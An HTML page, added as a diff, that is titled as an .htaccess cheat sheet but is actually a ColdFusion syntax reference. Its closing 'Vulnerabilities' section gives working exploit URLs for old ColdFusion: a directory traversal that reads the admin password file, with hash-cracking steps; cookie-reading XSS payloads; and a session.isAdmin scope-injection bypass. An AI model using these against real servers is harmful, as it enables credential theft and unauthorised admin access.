@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+<html lang="en-GB">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="x-ua-compatible" content="ie=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+		<script>document.getElementsByTagName("html")[0].className += " js";</script>
+		<link rel="stylesheet" href="css/style2.css">
+        <meta http-equiv="Content-Security-Policy" content="block-all-mixed-content">
+
+        <title>.htaccesss Cheat Sheet</title>
+        <meta name="description" content=".htaccesss File Cheat Sheet - A reference for Increased Security.">
+
+        <link rel="stylesheet" href="css/style.css">
+
+        <link rel="apple-touch-icon" sizes="180x180" href="img/images.png">
+        <link rel="icon" type="image/png" sizes="32x32" href="img/images.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="img/images.png">
+        <link rel="shortcut icon" href="img/favicon.ico">
+        <meta name="theme-color" content="#ffffff">
+
+        <meta property="og:url" content="https://github.com/stefanpejcic/htaccess">
+        <meta property="og:type" content="website">
+        <meta property="og:title" content=".htaccesss Cheat Sheet">
+        <meta property="og:image" content="https://github.com/stefanpejcic/htaccess/img/images.png">
+        <meta property="og:description" content=".htaccesss Cheat Sheet - A reference for .htaccesss goodness.">
+        <meta property="og:site_name" content=".htaccesss Cheat Sheet">
+        <meta property="og:locale" content="en_GB">
+
+        <meta name="twitter:card" content="summary_large_image">
+        <meta name="twitter:site" content="@StefanPejcic>
+        <meta name="twitter:creator" content="@StefanPejcic">
+        <meta name="twitter:url" content="https://github.com/stefanpejcic/htaccesss">
+        <meta name="twitter:title" content=".htaccesss Cheat Sheet">
+        <meta name="twitter:description" content=".htaccesss Cheat Sheet - A reference for CF goodness.">
+        <meta name="twitter:image" content="https://github.com/stefanpejcic/htaccesss/img/images.png">
+
+        <meta itemprop="name" content=".htaccesss Cheat Sheet">
+        <meta itemprop="description" content=".htaccesss Cheat Sheet - A reference for CF goodness.">
+        <meta itemprop="image" content="https://github.com/stefanpejcic/htaccesss/img/img/images.png">
+		
+        <meta name="robots" content="index,follow,noodp">
+        <meta name="googlebot" content="index,follow">
+
+        <meta name="format-detection" content="telephone=no">
+
+        <link href="https://fonts.googleapis.com/css?family=Muli:400,600,700" rel="stylesheet">
+		
+        <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+        <![endif]-->
+    </head>
+
+    <body>
+        <div class="bgBlob bgBlob--1"></div>
+        <div class="bgBlob bgBlob--2"></div>
+        <div class="svgcompile"><svg xmlns="http://www.w3.org/2000/svg"><symbol viewBox="0 0 14 11.9" id="github"><title>github</title> <g> <g> <path d="M9.4,6.9c0.3,0,0.5,0.1,0.7,0.4c0.2,0.3,0.3,0.6,0.3,1c0,0.4-0.1,0.7-0.3,1C9.9,9.5,9.7,9.6,9.4,9.6
+            c-0.3,0-0.5-0.1-0.7-0.4C8.5,9,8.4,8.7,8.4,8.3c0-0.4,0.1-0.7,0.3-1C8.9,7,9.2,6.9,9.4,6.9 M12.9,3.3c0.7,0.8,1.1,1.8,1.1,3
+            c0,0.7-0.1,1.4-0.3,2c-0.2,0.6-0.4,1.1-0.7,1.5c-0.3,0.4-0.6,0.7-1,1c-0.4,0.3-0.7,0.5-1.1,0.6c-0.3,0.1-0.7,0.2-1.1,0.3
+            c-0.4,0.1-0.7,0.1-0.9,0.1c-0.2,0-0.4,0-0.7,0c-0.1,0-0.2,0-0.5,0c-0.3,0-0.6,0-0.8,0s-0.5,0-0.8,0c-0.3,0-0.5,0-0.5,0
+            c-0.2,0-0.5,0-0.7,0c-0.2,0-0.5-0.1-0.9-0.1c-0.4-0.1-0.8-0.2-1.1-0.3c-0.3-0.1-0.7-0.3-1.1-0.6c-0.4-0.3-0.7-0.6-1-1
+            C0.7,9.4,0.4,8.9,0.3,8.3C0.1,7.7,0,7,0,6.3c0-1.2,0.4-2.1,1.1-3C1,3.3,1,2.9,1.1,2.1C1.2,1.4,1.3,0.7,1.6,0
+            c0.9,0.1,2.1,0.6,3.5,1.6C5.5,1.5,6.2,1.4,7,1.4c0.9,0,1.5,0.1,1.9,0.2c0.6-0.4,1.2-0.8,1.8-1c0.6-0.3,1-0.4,1.3-0.5L12.4,0
+            c0.3,0.6,0.4,1.4,0.5,2.1C13,2.9,13,3.3,12.9,3.3 M7,11.2c1.7,0,3-0.2,3.8-0.6c0.9-0.4,1.3-1.2,1.3-2.5c0-0.7-0.3-1.3-0.8-1.8
+            c-0.3-0.3-0.6-0.4-1-0.5c-0.4-0.1-0.9-0.1-1.7,0C7.8,5.8,7.3,5.8,7,5.8c-0.4,0-0.8,0-1.3-0.1c-0.5,0-0.9-0.1-1.2-0.1
+            c-0.3,0-0.6,0-1,0.1C3.2,5.9,2.9,6,2.7,6.2C2.2,6.7,1.9,7.3,1.9,8.1c0,1.3,0.4,2.1,1.3,2.5C4,11,5.3,11.2,7,11.2L7,11.2 M4.6,6.9
+            c0.3,0,0.5,0.1,0.7,0.4c0.2,0.3,0.3,0.6,0.3,1c0,0.4-0.1,0.7-0.3,1C5.1,9.5,4.9,9.6,4.6,9.6c-0.3,0-0.5-0.1-0.7-0.4
+            C3.7,9,3.6,8.7,3.6,8.3c0-0.4,0.1-0.7,0.3-1C4.1,7,4.3,6.9,4.6,6.9"/> </g> </g> </symbol></svg></div>
+
+        <header class="container">
+            <div class="row">
+                <div class="col">
+                    <h5 class="sidebar__title">.htaccesss</h5>
+                </div>
+                <div class="col">
+                    <div class="icon">
+                      <div class="top"></div>
+                      <div class="mid"></div>
+                      <div class="bot"></div>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <div class="sidebar">
+            <h5 class="sidebar__title">.htaccesss</h5>
+
+            <nav class="sidebar__nav">
+                <ul>
+                    <li><a href="#variables">Set variables</a></li>
+                    <li><a href="#print-out">Print out</a></li>
+                    <li><a href="#arrays">Arrays</a></li>
+                    <li><a href="#loops">Loops</a></li>
+                    <li><a href="#structures">Structures</a></li>
+                    <li><a href="#queries">Queries</a></li>
+		    <li><a href="#logs">Logs</a></li>
+                    <li><a href="#security">Security</a></li>
+                    <li><a href="#errors">Error Handling</a></li>
+                    <li><a href="#debug">Debugging</a></li>
+                    <li><a href="#comments">Comments</a></li>
+					<li><a href="#vulnerability">Vulnerabilities</a></li>
+					<li><a href="#tricks">Tips & Tricks</a></li>
+                </ul>
+            </nav>
+
+            <div class="social">
+			<p style="margin-bottom:10px;">join the dark side</p>
+			<div class="switch" style="margin-bottom:100px;">
+                <input class="switch__input" type="checkbox" id="themeSwitch">
+                <label aria-hidden="true" class="switch__label" for="themeSwitch">On</label>
+                <div aria-hidden="true" class="switch__marker"></div>
+            </div>
+                <a target="_blank" href="https://github.com/stefanpejcic/coldfusion"><svg viewBox="0 0 14 11.9"><use xlink:href="#github"/></svg> Contribute</a>
+            </div>
+        </div>
+
+        <div class="content">
+            <h1 class="content__title">.htaccess Cheat Sheet</h1>
+            <h3 class="content__subTitle">All the important Apache .htaccess web server rules and config options</h3>
+
+            <div class="container">
+                <a class="bmc-button" target="_blank" href="https://www.buymeacoffee.com/stefanpejcic"><img src="https://www.buymeacoffee.com/assets/img/BMC-btn-logo.svg" alt="Buy me a cup of coffee"><span style="margin-left:5px">Donate a Cup of Coffee ❤️</span></a>
+            </div>
+
+            <section class="container section" id="variables">
+                <h3 class="section__title">Set variables</h3>
+                <p class="section__title" style="margin-bottom: 10px; margin-top: -15px;">Use <i>cfset</i> to create a variable (if it doesn't exist) and assign it a value. You can also use it to call functions.</p>
+
+                <div class="row">
+                    
+					<div class="col-md-6 col-lg-3">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Current time</p>
+								
+                                <pre>&#x3c;cfset currentTime = now() /></br></br></pre>
+								
+                            </div>
+							<!--div class="dugme">
+                            <a class="dugmence" target="_blank" href="https://helpx.adobe.com/coldfusion/cfml-reference/coldfusion-tags/tags-j-l/cfloop-looping-over-a-date-or-time-range.html">Learn More</a>
+							</div-->
+                        </div>
+                    </div>
+                    <div class="col-md-6 col-lg-3">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Regular string</p>
+                                <pre>&#x3c;cfset name = "Archi" /></br></br></pre>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6 col-lg-3">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Integer</p>
+                                <pre>&#x3c;cfset age = 29 /></br></br></pre>
+                            </div>
+                        </div>                        
+                    </div>
+					<div class="col-md-6 col-lg-3">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Concatenate variable and string</p>
+                                <pre>&#x3c;cfset todayDate = "Today is: #now()#" />
+&#x3c;cfset greeting = "Hello " & name /></pre>
+                            </div>
+                        </div>
+                    </div>
+					<div class="col-md-6 col-lg-6">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Array</p>
+                                <pre>&#x3c;cfset dataArray = [dateFormat(now(), "short"), dateFormat(dateadd('d',1,now()), "short"), "Me", 42] /></pre>
+                            </div>
+                        </div>
+                    </div>
+					<div class="col-md-6 col-lg-6">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Data structure</p>
+                                <pre>&#x3c;cfset dictionary = { today = dateFormat(now(), "short"), tomorrow = dateFormat(dateadd('d', 1, now()), "short"), who = "Me", the_answer_to_life_and_everything_else = 42 } /></pre>
+								</code>
+                            </div>
+                        </div>
+                    </div>
+                    
+                </div>
+            </section>
+            <section class="container section" id="print-out">
+                <h3 class="section__title">Print out</h3>
+
+                <div class="row">
+                    <div class="col-md-6 col-lg-6">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm">Hard coded string</p>
+                                <pre>&#x3c;cfdump var = "This is a message for you" />
+&#x3c;cfoutput>This is a message for you&#x3c;/cfoutput></pre>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6 col-lg-6">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm">Variable</p>
+                                <pre>&#x3c;cfdump var = "#name#" /> _same as inspect in ruby_
+&#x3c;cfoutput>#name#&#x3c;/cfoutput> _same as puts in ruby_</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+			<section class="container section" id="arrays">
+                <h3 class="section__title">Arrays</h3>
+                <p class="section__title" style="margin-bottom: 10px; margin-top: -15px;">Arrays don't start from 0 like in every other language instead start from 1</p>
+
+                <div class="row">
+                    
+					<div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Create array literal</p>
+                                <pre>&#x3c;cfset someThings = ["Boca", "Futbol", 42] /></pre>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Constructor</p>
+                                <pre>&#x3c;cfset sameArray = arrayNew(1) /></pre>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Adding elements in an specific index</p>
+                                <pre>&#x3c;cfset someThings[4] = "Ruby on Rails" /></pre>
+                            </div>
+                        </div>                        
+                    </div>
+					<div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Appending</p>
+                                <pre>&#x3c;cfset ArrayAppend(someThings, "Destiny") /></pre>
+                            </div>
+                        </div>
+                    </div>
+					<div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Looping over the array</p>
+                                <pre>&#x3c;cfloop array = "#someThings#" index = "thing">
+    &#x3c;cfoutput>#thing#&#x3c;/cfoutput>
+&#x3c;/cfloop></pre>
+                            </div>
+                        </div>
+                    </div>
+				
+                    
+                </div>
+            </section>
+			<section class="container section" id="loops">
+                <h3 class="section__title">Loops</h3>
+                <p class="section__title" style="margin-bottom: 10px; margin-top: -15px;">There are several different types of for and while loops in ColdFusion. <br>For more info please see the docs for <a href="https://cfdocs.org/cfscript">cfloop</a>.</p>
+
+                <div class="row">
+                    
+					<div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">FOR Loop</p>
+                                <pre style="height: 160px;">for (i=1;i LTE ArrayLen(array);i=i+1) {
+	WriteOutput(array[i]);
+}</pre>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">While Loop</p>
+                                <pre style="height: 160px;">x = 0;
+while (x LT 5) {
+	x = x + 1;
+	WriteOutput(x);
+}
+//OUTPUTS 12345</pre>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Do While Loop</p>
+                                <pre style="height: 160px;">x = 0;
+do {
+ x = x+1;
+ WriteOutput(x);
+} while (x LTE 0);
+// OUTPUTS 1</pre>
+                            </div>
+                        </div>                        
+                    </div>
+					<div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">FOR IN Loop (Structure)</p>
+                                <pre style="height: 160px;">struct = StructNew();
+struct.one = "1";
+struct.two = "2";
+for (key in struct) {
+	WriteOutput(key);
+}
+//OUTPUTS onetwo</pre>
+                            </div>
+                        </div>
+                    </div>
+					<div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">FOR IN Loop (Array)</p>
+                                <pre style="height: 160px;">cars = ["Ford","Dodge"];
+for (car in cars) {
+	WriteOutput(car);
+}
+//OUTPUTS FordDodge</pre>
+                            </div>
+                        </div>
+                    </div>
+					<div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">FOR IN Loop (Query)</p>
+                                <pre style="height: 160px;">cars = QueryNew("make,model",
+	"cf_sql_varchar,cf_sql_varchar",
+	[["Ford", "T"],["Dodge","30"]]);
+for (car in cars) {
+	WriteOutput("Model " & car.model);
+}
+//OUTPUTS Model TModel 30</pre>
+                            </div>
+                        </div>
+                    </div>
+				
+                    
+                </div>
+            </section>
+			<section class="container section" id="structures">
+                <h3 class="section__title">Structures</h3>
+                <p class="section__title" style="margin-bottom: 10px; margin-top: -15px;">This are like dictionaries in Python or hashes in Ruby</p>
+
+                <div class="row">
+                    <div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm">Create structure literal</p>
+                                <pre>&#x3c;cfset aGuy = {} />
+&#x3c;cfset batman = {
+    "first_name" = "Bruno",
+    "last_name" = "Diaz",
+    "age" = 42
+} /></pre>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm">Constructor</p>
+                                <pre>&#x3c;cfset aGuy = structNew() /></pre>
+                            </div>
+                        </div>
+                    </div>
+					<div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm">Adding elements with brackets</p>
+                                <pre>&#x3c;cfset aGuy["first_name"] = "Ezequiel" />
+&#x3c;cfset aGuy["last_name"] = "Lopez" /></pre>
+                            </div>
+                        </div>
+                    </div>
+					<div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm">Adding elements with dot notation</p>
+                                <pre>&#x3c;cfset aGuy.age = 29 />
+&#x3c;cfset aGuy.height = "5' 11\"" /></pre>
+                            </div>
+                        </div>
+                    </div>
+					<div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm">Looping over the structure</p>
+                                <pre>&#x3c;cfloop collection = "aGuy" item = "data">
+    &#x3c;cfoutput>#aGuy[data]#: #data#&#x3c;/cfoutput>
+&#x3c;/cfloop></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <section class="container section" id="queries">
+                <h3 class="section__title">Queries</h3>
+                <p class="section__title" style="margin-bottom: 10px; margin-top: -15px;">Use SQL in coldfusion to retrieve data form a database or enter data in it</p>
+
+                <div class="row">
+                    <div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Query</p>
+                                <pre style="height:13pc">var queryOptions = { datasource: "appMain" };
+var data = queryExecute(
+  "SELECT * FROM users", {}, queryOptions
+);</pre>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Allocate query result into variable & retrieve info</p>
+                                <pre style="height:13pc">&#x3c;cfquery name="firstQ" datasource="tsdata.ts24">
+    SELECT * FROM TestTable
+&#x3c;/cfquery></pre>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Looping over the Query</p>
+                                <pre style="height:13pc">&#x3c;cfoutput>
+    &#x3c;cfloop query="#firstQ#">
+        &#x3c;p>&#x3c;i>myDataAlfa: &#x3c;/i>#firstQ.myDataAlfa# &#x3c;i>myDataInt: &#x3c;/i>#firstQ.myDataInt#&#x3c;/p>
+    &#x3c;/cfloop>
+    
+    &#x3c;!--- Extra data to get from the query --->
+    &#x3c;p>#firstQ.columnlist#&#x3c;/p>
+    &#x3c;p>#firstQ.recordcount#&#x3c;/p>
+&#x3c;/cfoutput></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+			<section class="container section" id="logs">
+                <h3 class="section__title">Logging</h3>
+				<p class="section__title" style="margin-top:-15px!important;margin-bottom:10px">Logging stuff</p>
+
+                <div class="row">
+                    <div class="col-md-6 col-lg-6">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Clear Log</p>
+<pre>
+var logDir = expandPath( "/logs/" );
+var logs = directoryList(
+  path = logDir,
+  listInfo = "name",
+  filter = "*.log",
+  type = "file",
+  recurse = "false"
+);
+for( var log in logs ){
+  var fullPath = logDir & log ;
+  if( fileExists( fullPath ) ){
+    fileDelete( fullPath );
+  }
+}
+</pre>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6 col-lg-6">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">LogBox</p>
+                                <pre>
+component {
+  // ...
+  function onError( exception ){
+   // uLogging error with logbox...
+    writeOutput( "Upisivanje greske u log fajlu.." );
+    logger.error(
+        "Doslo je do greske u aplikaciji: #exception.message# #exception.detail#"
+        exception
+    );
+
+    // error page
+    include "views/error.cfm";
+  }
+}
+</pre>
+                            </div>
+                        </div>
+                    </div>
+
+                    
+                </div>
+            </section>
+            <section class="container section" id="security">
+                <h3 class="section__title">Security</h3>
+				<p class="section__title" style="margin-top:-15px!important;margin-bottom:10px">Security-related settings for Application.cfc file</p>
+
+                <div class="row">
+                    <div class="col-md-6 col-lg-12">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Lock down APP</p>
+                                <pre>// Application.cfc
+component {
+  this.name = "myApp";
+  this.blockedExtForFileUpload = "*";
+  this.scriptProtect					 = "all";
+  this.sessioncookie = {
+    httpOnly: true,
+    secure  : true
+  };
+}</pre>
+                            </div>
+                        </div>
+                    </div>
+
+                    
+                </div>
+            </section>
+			<section class="container section" id="errors">
+                <h3 class="section__title">Error Handling</h3>
+				<p class="section__title" style="margin-top:-15px!important;margin-bottom:10px">ColdFusion provides a variety of tools to customize error information and handle errors when they occur.</p>
+
+                <div class="row">
+                    <div class="col-md-6 col-lg-5">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Try / Catch / Throw / Finally / Rethrow</p>
+                                <pre style="height:200px">try {
+	throw(message="Oops", detail="xyz");
+} catch (any e) {
+	WriteOutput("Error: " & e.message);
+	rethrow;
+	
+} finally {
+	WriteOutput("I run even if no error");
+}</pre>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="col-md-6 col-lg-7">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">OnError Exception</p>
+<pre style="height:200px">
+  public function onError(required exception, required string eventName)
+  {
+    var factory = new App.ExceptionFactory();
+    var e = factory.getNewException(arguments.eventName, arguments.exception);
+    if (e.logError()) {
+      var loggingFile = new App.SomeLoggingCfc(arguments.eventName, arguments.exception);
+      loggingFile.commitLog();
+    }
+    if (e.debugError()) {}
+    e.throwException();
+  } 
+  public ExceptionFactory function getNewException(required string eventName, required exception)
+  {
+    return new "App.#exception.type#"(argumentCollection = arguments);
+  } 
+  public boolean function logError() {}
+  public boolean function debugError() {}
+  public function throwException() {}
+</pre>
+                            </div>
+                        </div>
+                    </div>
+ <div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Output CF Error details without CFDump</p>
+<pre>
+&#x3c;cftry>
+   ...
+&#x3c;cfcatch>
+   &#x3c;cf_OutputCFCatch CFCatch="#CFCatch#" />
+&#x3c;/cfcatch>
+&#x3c;/cftry>
+</pre>
+                            </div>
+                        </div>
+                    </div>
+                    
+                </div>
+            </section>
+			<section class="container section" id="debug">
+                <h3 class="section__title">Debugging</h3>
+                <p class="section__title" style="margin-bottom: 10px; margin-top: -15px;">You can use CFML tags and functions to display or hide debugging and tracing information.</p>
+
+                <div class="row">
+                    
+					<div class="col-md-6 col-lg-3">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Control Debugging Output</p>
+                                <pre style="height:110px">&#x3c;cfsetting showDebugOutput="No"></pre>
+								</code>
+                            </div>
+                        </div>
+                    </div>
+					<div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Show Query exec.time</p>
+                                <pre style="height:110px">&#x3c;cfquery name="TestQuery" datasource="cfexample" debug>
+SELECT * FROM TestTable
+&#x3c;/cfquery></pre>
+								</code>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6 col-lg-5">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Log Values to MyAppSilentTrace.log</p>
+                                <pre style="height:110px">&#x3c;cfif IsDebugMode()>
+&#x3c;cflog file="MyAppSilentTrace" text="Page: #cgi.script_name#,
+completed query MyDBQuery; Query Execution time:
+#cfquery.ExecutionTime# Status: #Application.status#">
+&#x3c;/cfif></pre>
+								</code>
+                            </div>
+                        </div>
+                    </div>
+                    
+                </div>
+            </section>
+			<section class="container section" id="comments">
+                <h3 class="section__title">Comments</h3>
+                <p class="section__title" style="margin-bottom: 10px; margin-top: -15px;">ColdFusion comments have a similar format to HTML comments but use three dash characters instead of two.</p>
+
+                <div class="row">
+                    
+					<div class="col-md-6 col-lg-5">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Single line comment</p>
+                                <pre style="height:110px">&#x3c;!--- This is a ColdFusion Comment. Browsers do not receive it. ---></pre>
+								</code>
+                            </div>
+                        </div>
+                    </div>
+					<div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Single line comment</p>
+                                <pre style="height:110px">mojo = 1; //THIS IS A COMMENT</pre>
+								</code>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6 col-lg-3">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Multiline comment</p>
+                                <pre style="height:110px">/* This is a comment
+	that can span
+	multiple lines
+*/</pre>
+								</code>
+                            </div>
+                        </div>
+                    </div>
+                    
+                </div>
+            </section>
+			<section class="container section" id="vulnerability">
+                <h3 class="section__title">Vulnerabilities</h3>
+                <p class="section__title" style="margin-bottom: 10px; margin-top: -15px;">ColdFusion had a lot of security vulnerabilities in the past, so stop using older versions!</p>
+
+                <div class="row">
+                    
+					<div class="col-md-6 col-lg-12">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <h5 class="col-xs-12 col-sm-12"># CVE-2010-2861 - Adobe ColdFusion Unspecified Directory Traversal Vulnerability</h5>
+								<small  class="col-xs-12 col-sm-12">detailed information about the exploitation of this vulnerability: <a href="http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/">http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/</a></small>
+								<h6  class="col-xs-12 col-sm-12">1. open file in browser</h6>
+                                <pre style="">http://[server:port]/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en</pre>
+                            </div>
+							<div class="row justify-content-between align-items-center">
+								<h6  class="col-xs-12 col-sm-12">2. copy the hashed password</h6>
+                                <pre style="">#Fri Feb 07 05:48:45 PST 2020 rdspassword= password=42DABCDFADADASASAS4891539FASDA11CA5 encrypted=true</pre>
+
+								<h6  class="col-xs-12 col-sm-12">3. compare with rainbow tables</h6>
+                                <pre style="">https://www.dcode.fr/sha1-hash</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+				<div class="row">
+                    
+					<div class="col-md-6 col-lg-12">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <h5 class="col-xs-12 col-sm-12"># CVE-2009-1872 - Adobe ColdFusion Server Query String Cross-Site Scripting</h5>
+								<small  class="col-xs-12 col-sm-12">detailed information about the exploitation of this vulnerability: <a href="https://www.securityfocus.com/bid/36046/info">https://www.securityfocus.com/bid/36046/info</a></small>
+								<h6  class="col-xs-12 col-sm-12">1. open file in browser</h6>
+                                <pre style="">http://www.example.com:8500/CFIDE/componentutils/componentdetail.cfm?component=&#x3c;body%20onload=alert(document.cookie)></pre>
+                                <pre style="">http://www.example.com:8500/CFIDE/componentutils/cfcexplorer.cfc?method=getcfcinhtml&name=%3Cbody%20onload=alert(document.cookie)%3E</pre>
+                                <pre style="">http://www.example.com:8500/CFIDE/componentutils/cfcexplorer.cfc?method=%3Cbody%20onload=alert(document.cookie)%3E</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+				<div class="row">
+                    
+					<div class="col-md-6 col-lg-12">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <h5 class="col-xs-12 col-sm-12"># Adobe ColdFusion Server Scope Injection</h5>
+								<small  class="col-xs-12 col-sm-12">detailed information about the exploitation of this vulnerability: <a href="https://www.petefreitag.com/item/834.cfm">https://www.petefreitag.com/item/834.cfm</a></small>
+								<h6  class="col-xs-12 col-sm-12">1. open any action (that checks session.isAdmin) in browser</h6>
+                                <pre style="">http://www.example.com:8500/CFIDE/componentutils/componentdetail.cfm</pre>
+                                <h6  class="col-xs-12 col-sm-12">2. append the following to the url</h6>
+                                <pre style="">?session.isAdmin=1</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+			<section class="container section" id="tricks">
+                <h3 class="section__title">Tricks</h3>
+                <p class="section__title" style="margin-bottom: 10px; margin-top: -15px;">Tips & Tricks on becoming ColdFusion Pro!</p>
+
+<div class="row">
+                    
+					<div class="col-md-6 col-lg-6">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Find the Java Version Used by ColdFusion or Railo</p>
+                                <pre>&#x3c;cfoutput>#CreateObject("java", "java.lang.System").getProperty("java.version")#&#x3c;/cfoutput></pre>
+                            </div>
+                        </div>
+                    </div>
+					<div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Per-Application ColdFusion Mappings</p>
+                                <pre>&#x3c;cfset this.mappings["/test"]="c:\inetpub\wwwroot\test"></pre>
+								</code>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6 col-lg-4">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Restart a ColdFusion Application</p>
+                                <pre>&#x3c;cfset ApplicationStop() />
+&#x3c;cflocation url="index.cfm" addtoken="false" /></pre>
+								</code>
+                            </div>
+                        </div>
+                    </div>
